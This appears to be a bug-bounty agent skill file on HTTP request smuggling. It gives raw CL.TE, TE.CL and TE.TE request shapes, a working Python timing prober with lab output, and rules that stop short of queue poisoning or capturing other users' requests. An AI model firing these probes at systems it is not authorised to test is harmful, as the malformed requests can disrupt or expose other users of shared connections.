# Request Smuggling / Desync — two hops disagree about where a request ends

<!-- workspace rung mapping -->

> **Rung mapping.** This file was written against a five-rung safety ladder. In this workspace those rungs are: **1** read-only · **2** write to an object _you_ own, reverted immediately · **3** bounded scale proof, 5–10 records, never a dump · **4** the same proof relocated to a UAT/OAT host · **5** anything touching a third party's object — **pause and ask d0x directly before executing**, providing the exact request, affected state and rollback plan. This is interactive routing, not a terminal state.

## Contents

- The hard safety line — read before the first probe
- The variants on the wire (CL.TE, TE.CL, TE.TE, H2.CL, H2.TE)
- Safe detection — the timing differential (the shipped prober)
- Reading the output — including the false-positive that looks identical
- The self-targeted differential — the last safe rung
- What is rung 5 and does not happen on prod
- Why it converts — front-end authz bypass
- Stating prod impact by inference
- Converts?
- Evidence checklist
- Handoffs

This file is the pack's single owner of desync. Safe ladder: the **Rung mapping** above.

**Before you reach for desync, try the safe route to the same impact.** The payable outcome here is almost always "reach a path the edge blocks" — which the path-normalization / 403-bypass ladder in `role-matrix.md` §1b reaches with zero shared-socket risk. Run that first. Desync is for the case where the edge holds against every transform and you have evidence the two hops parse differently.

## The hard safety line — read before the first probe

A smuggled prefix does not stay in your connection. It sits at the head of the back-end's socket buffer and is **prepended to whoever's request arrives next on that socket** — a real user's. That is the entire risk model, and it does not care about intent:

- their request gets your method/path/headers → they see your response, or an error, or an admin page they should not see;
- your prefix captures their request line, cookies and body into a parameter you read → you have exfiltrated a stranger's session credential;
- a poisoned socket persists for the life of the keep-alive pool, hitting many users.

So: **the only proofs allowed on production are self-contained.** A probe that declares a length the next hop waits for, and then closes, injects nothing. Every probe in the shipped tool is of that shape and every probe runs on a **fresh connection that is closed immediately**. Queue poisoning, request capture, and serving your response to another user are **rung 5 — not to be performed on prod at all**, and not here on staging either: nobody is watching the run, so there is no window to agree on. Carry the exact requests in a direct approval request to d0x instead.

## The variants on the wire

Front-end (`FE`) and back-end (`BE`) each pick a body-length rule. The variant is named for who wins.

| Variant | FE uses | BE uses | Shape that triggers it |
| --- | --- | --- | --- |
| `CL.TE` | `Content-Length` | `Transfer-Encoding` | both headers present; CL shorter than the chunked stream |
| `TE.CL` | `Transfer-Encoding` | `Content-Length` | both headers present; chunk stream terminates before CL is satisfied |
| `TE.TE` | one hop is fooled by an obfuscated `Transfer-Encoding` |  | duplicated / mangled TE header |
| `H2.CL` | HTTP/2 frame length | `Content-Length` after downgrade | h2 request carrying a _lying_ `content-length` |
| `H2.TE` | HTTP/2 frame length | `Transfer-Encoding` after downgrade | h2 request smuggling a `transfer-encoding: chunked` header |

`CL.TE`, on the wire (`Content-Length: 4` covers only `1\r\nA`):

```
POST /x HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

`TE.CL` (`Content-Length: 6`, the chunk stream ends at the `0` chunk after 5 bytes):

```
POST /x HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

`TE.TE` — same bodies, but the TE header is written so exactly one hop still parses it: a trailing space in the header name (`Transfer-Encoding : chunked`), a duplicate pair where one value is `xchunked`, `Transfer-Encoding:\tchunked`, or a second TE header on a folded line.

`H2.CL` / `H2.TE` exist only where an h2 edge **downgrades** to HTTP/1.1 for the origin: h2 frames carry their own length, so a `content-length` or `transfer-encoding` header the h2 layer never validated is rewritten verbatim into the h1 request the back-end reads.

**Tooling reality**: this host cannot generate a lying-length h2 request. `curl` speaks h2 but computes its own lengths and rejects `Transfer-Encoding` in h2; `h2load`/`nghttp` are absent; the python `h2` module (4.3.0) is importable but no tested implementation ships here — do not paste an untested h2 client at a live edge. Treat `H2.*` as **recognition-only**: confirm the edge downgrades (`curl -sI --http2` returns `2` while the origin is h1, `Via:`/`X-Served-By` name a proxy), record it as an unexplored angle in `notes/`, and run the h1 timing oracle on the same host — a `CL.TE`/`TE.CL` result on the h1 listener is evidence about the same back-end pool.

## Safe detection — the timing differential (the shipped prober)

The oracle: if the back-end is left waiting for body bytes the front-end never forwarded, it blocks until its own read timeout. That delay is measurable from the client and injects nothing.

```bash
mkdir -p targets/<program>/gadgets && cat > targets/<program>/gadgets/desync_probe.py <<'PY'
#!/usr/bin/env python3
"""Safe desync (request-smuggling) timing prober -- python3 stdlib only.

usage: python3 desync_probe.py <host> [--port 443] [--tls] [--path /] [--to 10]

Sends ONLY self-contained probes on FRESH connections. Nothing is ever left in a
socket for the next request, so no other user's request can be affected. Queue
poisoning / request capture is NOT implemented on purpose (safe-ladder rung 5).
Oracle: probe TTFB - control TTFB > ~5 s = the back-end waited for bytes the
front-end never forwarded.
"""
import argparse, socket, ssl, sys, time

ap = argparse.ArgumentParser()
ap.add_argument("host")
ap.add_argument("--port", type=int, default=0)
ap.add_argument("--tls", action="store_true")
ap.add_argument("--path", default="/")
ap.add_argument("--to", type=float, default=10.0)
a = ap.parse_args()
port = a.port or (443 if a.tls else 80)
H, P = a.host, a.path


def R(hdrs, body):
    h = "".join(f"{k}: {v}\r\n" for k, v in hdrs)
    return (f"POST {P} HTTP/1.1\r\nHost: {H}\r\n{h}Connection: close\r\n\r\n"
            ).encode() + body


CT = ("Content-Type", "application/x-www-form-urlencoded")
PROBES = {
    # control: valid terminated chunked body, both hops agree -> fast
    "control-chunked": R([CT, ("Transfer-Encoding", "chunked"),
                          ("Content-Length", "11")], b"1\r\nA\r\n0\r\n\r\n"),
    # same bytes with NO Transfer-Encoding: proves the path itself is fast
    "control-plain": R([CT, ("Content-Length", "7")], b"1\r\nA\r\nX"),
    # CL.TE: front honours CL=4 and forwards only "1\r\nA"; a TE back-end
    # blocks waiting for the chunk terminator -> slow
    "CL.TE": R([CT, ("Transfer-Encoding", "chunked"),
                ("Content-Length", "4")], b"1\r\nA\r\nX"),
    # TE.CL: front honours TE and stops at the 0-chunk; a CL=6 back-end
    # blocks waiting for the 6th body byte -> slow
    "TE.CL": R([CT, ("Transfer-Encoding", "chunked"),
                ("Content-Length", "6")], b"0\r\n\r\nX"),
    # TE.TE: one hop is fooled by the obfuscated header, the other is not
    "TE.TE-space": R([CT, ("Transfer-Encoding", "chunked"),
                      ("Transfer-Encoding ", "chunked"),
                      ("Content-Length", "4")], b"1\r\nA\r\nX"),
    "TE.TE-xchunk": R([CT, ("Transfer-Encoding", "xchunked"),
                       ("Transfer-Encoding", "chunked"),
                       ("Content-Length", "4")], b"1\r\nA\r\nX"),
}

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def ttfb(raw):
    t = time.perf_counter()
    try:
        s = socket.create_connection((H.split(":")[0], port), timeout=a.to)
        if a.tls:
            s = ctx.wrap_socket(s, server_hostname=H.split(":")[0])
    except (socket.timeout, OSError, ssl.SSLError) as e:
        # most often --tls against a plaintext port, or --port wrong
        return time.perf_counter() - t, f"<connect/tls failed: {type(e).__name__} - wrong port, or not TLS>"
    try:
        s.sendall(raw)
        d = s.recv(64)
        el = time.perf_counter() - t
        st = d.split(b"\r\n")[0].decode("utf-8", "replace") or "<socket closed, no status>"
    except (socket.timeout, OSError):
        el, st = time.perf_counter() - t, "<no response before timeout>"
    s.close()                                  # never reuse a probed socket
    return el, st


base = None
for name, raw in PROBES.items():
    el, st = ttfb(raw)
    if base is None:
        base = el
    flag = "  <== DESYNC CANDIDATE" if el - base > 5 else ""
    print(f"{name:<16} {el:7.3f}s  {st}{flag}")
print(f"\n# control baseline {base:.3f}s. A candidate must reproduce on a second "
      f"run and disappear when Transfer-Encoding is removed.", file=sys.stderr)
PY

python3 targets/<program>/gadgets/desync_probe.py app.target.com --tls --path /api/login
```

Pick a `--path` that is a real POST handler (login, search, cart) — a `404` short-circuit answers before the body is read and hides the delay.

Executed against a two-hop local lab (front-end honours `Content-Length`, back-end honours `Transfer-Encoding` — a genuine CL.TE):

```
control-chunked    0.006s  HTTP/1.1 200 OK
control-plain      0.002s  HTTP/1.1 200 OK
CL.TE              8.010s  <socket closed, no status>  <== DESYNC CANDIDATE
TE.CL              0.003s  HTTP/1.1 200 OK
TE.TE-space        8.010s  <socket closed, no status>  <== DESYNC CANDIDATE
TE.TE-xchunk       8.004s  <socket closed, no status>  <== DESYNC CANDIDATE
```

8.0 s is the lab back-end's read timeout. With the lab flipped to `TE.CL` (front-end honours TE, back-end honours CL) the `TE.CL` probe took 8.011 s — and the `CL.TE` probe ran to the client's own 12 s timeout, which is the trap described below. The **negative control** — both hops using `Content-Length`, no desync possible — is clean, which is what makes the tool trustworthy:

```
control-chunked    0.006s  HTTP/1.1 200 OK
control-plain      0.002s  HTTP/1.1 200 OK
CL.TE              0.002s  HTTP/1.1 200 OK
TE.CL              0.002s  HTTP/1.1 200 OK
TE.TE-space        0.003s  HTTP/1.1 200 OK
TE.TE-xchunk       0.003s  HTTP/1.1 200 OK
```

## Reading the output — including the false-positive that looks identical

- **Only the delta matters.** Both controls must be fast. If `control-chunked` is already slow, the host is slow or rate-limiting; the run is void.
- **A `CL.TE` delay does not prove `CL.TE`.** Observed in the flipped lab: when the front-end parses chunked, that probe's _unterminated_ chunk stream blocks the **front-end**, producing a client-side delay identical to the desync one. The disambiguator is the `TE.CL` probe, whose body is a complete chunk stream — if it also hangs, the front-end is the one waiting and you have no evidence of a split. A delay on exactly one of `CL.TE` / `TE.CL`, with both controls fast, is the signal.
- **The `TE.TE` probes are supersets.** In a CL.TE lab they fire too, because a hop that ignores the obfuscated header falls back to `Content-Length`. Report the minimal probe that fires, not all four.
- **Reproduce or discard.** Re-run at least twice, minutes apart, and once with the `Transfer-Encoding` header removed. Load balancers retire back-ends; a one-off 8-second response is noise.
- Timeout values cluster at recognisable back-end defaults (5/10/30/60 s). A delay that equals your own `--to` means _your_ client gave up, not the server.

## The self-targeted differential — the last safe rung

Stronger than timing, still injecting nothing at a stranger: send the probe and your own follow-up **on the same connection you own**, so the only request that can be affected is yours. This is only safe where the _front-end_ keeps your connection distinct — it says nothing about the back-end pool, which is shared. Practically:

- if the front-end terminates and pools back-end connections (the normal case), a prefix you leave behind is **not yours any more**. Do not send one on prod.
- if you control both hops (a self-hosted reproduction of the same stack/versions fingerprinted on the target), do the full differential and even the queue-poisoning proof there, then report it as a reproduction, clearly labelled.

The honest position: on prod, stop at the timing oracle. The self-targeted differential is for your own lab or an explicitly authorised staging host.

## What is rung 5 and does not happen on prod

Named explicitly so nobody rediscovers them as "just one more step":

- smuggling a prefix and polling for the victim request that got appended (request capture / credential theft);
- poisoning the socket queue so the next user receives your response;
- smuggling a redirect/cache-key-changing prefix (desync → web cache poisoning);
- anything that persists in a keep-alive pool after your process exits.

Even where a program's policy explicitly invites smuggling PoCs, the exploit form is not fired here: carry the exact requests in a direct approval request to d0x. Nobody is watching the run, so there is no go-ahead to obtain mid-hunt.

## Why it converts — front-end authz bypass

The payable framing is not "the parsers disagree". It is: **the edge enforces an authorization decision on the path, and a smuggled prefix reaches the origin without that decision.** The edge blocks `/admin/*`, strips an internal header, requires mTLS or an SSO cookie, or rewrites the path — and the back-end, reading a request the edge never inspected, applies none of it. That is the same impact as card 1 and card 7b of this skill, arrived at through the socket instead of the path parser.

So when the timing oracle fires, **pivot to proving the authz asymmetry, not to poisoning the queue**:

- does the edge inject/strip headers the origin trusts (`X-Forwarded-For`, `X-Real-IP`, an auth-decision header, an internal service token)? Look for the origin's behaviour on those headers via any legitimate path — an `X-Original-URL` or `X-Forwarded-Prefix` acceptance from `role-matrix.md` §1b proves the origin trusts edge-supplied routing without any desync at all.
- is the origin reachable directly (`role-matrix.md` §1, `dig TXT` / SPF)? If so, demonstrate the _same_ bypass by dialling the origin — a complete, safe, reportable finding that needs no smuggling.

Both of those turn a hazardous desync lead into a safe proof of the impact the desync would have had.

## Stating prod impact by inference

When the timing oracle is all you can safely produce, write it exactly like this and nothing more:

> The front-end and back-end disagree on message length on `https://<host><path>`: a request declaring `Content-Length: 4` alongside `Transfer-Encoding: chunked` returns after 8.0 s while two byte-identical controls return in under 10 ms, reproduced N times. A back-end blocked waiting for bytes the front-end did not forward is a request-boundary desync; the residual bytes are prepended to the next request on that pooled connection. Exploitation was deliberately not performed: the next request on that socket belongs to another user. The edge-enforced control that would be bypassed is <the specific one>.

No "could potentially", no assumed severity — the measurement, the mechanism, and the named control. That is what a triager can act on, and it is also what tells them you knew where to stop.

## Converts?

Honest, and this is the class most likely to be closed as informative:

- **Timing-only, no exploitation** — many programs triage this as _informational_ or _needs proof_, because a delayed response has other explanations and they cannot reproduce impact from it. Expect that. File it as a **lead**, tell d0x, and do not promote it to a finding on the timing alone.
- **Medium/High** when the desync is paired with a _named_ edge control and you can show the origin does not enforce it — ideally proven the safe way (direct origin access, or an accepted routing header), with the desync as the mechanism.
- **Critical** is reserved for a demonstrated front-end authz bypass reaching admin functionality or a demonstrated credential capture — proofs that live on a lab/staging reproduction or on an explicitly authorised host, never opportunistically on prod.
- **Closed as N/A**: an 8-second response with no controls captured; a single unreproduced run; a `TE.TE` fire with no minimal probe isolated; a desync on a host the program does not own (CDN shared infrastructure — check whose edge it is before writing anything).

If the program's policy forbids smuggling/DoS-adjacent testing, the class is out — say so in `notes/` and rotate. Do not run the prober "just to see".

## Evidence checklist

- both controls with their timings (the run is void without them);
- the minimal probe that fires, byte-exact, with the delay;
- N≥2 reproductions, timestamped, plus one run with `Transfer-Encoding` removed;
- the disambiguation result (`CL.TE` vs `TE.CL` — which one, and why the other is not it);
- the fingerprinted hop chain (`Via`, `Server`, `X-Cache`, `X-Served-By`, h2 vs h1);
- the **named edge control** that would be bypassed, and whether it was reachable by a safe route instead;
- an explicit statement that no prefix was left in a shared connection.

## Handoffs

- `role-matrix.md` §1b — the safe path-normalization ladder to the same admin path. Run it before and instead of desync wherever it works.
- `role-matrix.md` §1 — WAF-origin bypass: reach the origin directly and prove the edge-only control with no shared-socket risk.
- the `auth-flow-bypass` skill — proxy/cache ACL differentials, the other non-desync way to defeat an edge decision.
- `resource-abuse` — if the intended follow-on was cache poisoning, its cache method and its safety bounds live there (the `resource-abuse` skill); the desync route to it is rung 5 and does not run on prod.
- `validation` — mandatory before reporting anything in this class.
